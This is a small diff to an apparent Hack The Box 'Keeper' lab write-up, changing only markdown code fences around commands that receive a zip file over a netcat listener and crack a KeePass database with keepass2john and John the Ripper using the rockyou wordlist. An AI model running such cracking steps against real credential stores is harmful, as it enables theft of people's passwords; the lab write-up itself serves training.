@@ -42,10 +42,11 @@ nc -l -p 9090 > keeper.zip
 
 Unzip:
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/8ec9d78e-9d40-4420-b4cb-517a8f99204b)
-```
+
 Cracking KeePass Database:
 ```
 keepass2john passcodes.kdbx > passcodes.hash
+```
 ```
 john --wordlist=/usr/share/wordlists/rockyou.txt passcodes.hash
 ```
